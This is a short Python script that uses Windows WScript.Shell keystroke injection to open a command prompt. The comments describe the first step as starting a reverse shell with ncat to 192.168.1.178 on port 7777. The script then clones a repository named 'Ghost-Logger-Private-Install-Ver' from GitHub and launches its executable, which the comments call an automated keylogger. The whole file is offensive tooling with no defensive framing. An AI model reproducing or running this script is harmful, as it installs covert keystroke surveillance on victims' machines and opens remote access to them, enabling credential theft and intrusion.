import win32com.client
import time


shell = win32com.client.Dispatch("WScript.Shell")


#Open up CMD for use
shell.Run("cmd.exe")
shell.AppActivate("Command Prompt")


#Sleep timer to make sure program opens up with time to be used
time.sleep(5)


#Access reverse shell using a netcat
shell.SendKeys("ncat 192.168.1.178 7777{ENTER}")


#Create directory
shell.SendKeys("mkdir Critical{ENTER}")


#Change directories to the newly made directory
shell.SendKeys("cd Critical{ENTER}")


#Grab the keylogger script
shell.SendKeys("git clone https://github.com/TalSoh/Ghost-Logger-Private-Install-Ver{ENTER}")


#Sleep timer to ensure script has proper time to install and be directed into
time.sleep(5)


#Change directories again to get into the scripts folder
shell.SendKeys("cd Ghost-Logger-Private-Install-Ver {ENTER}")


#Run the automated KeyLogger
shell.SendKeys("start ghostLoggerPrivate.exe{ENTER}")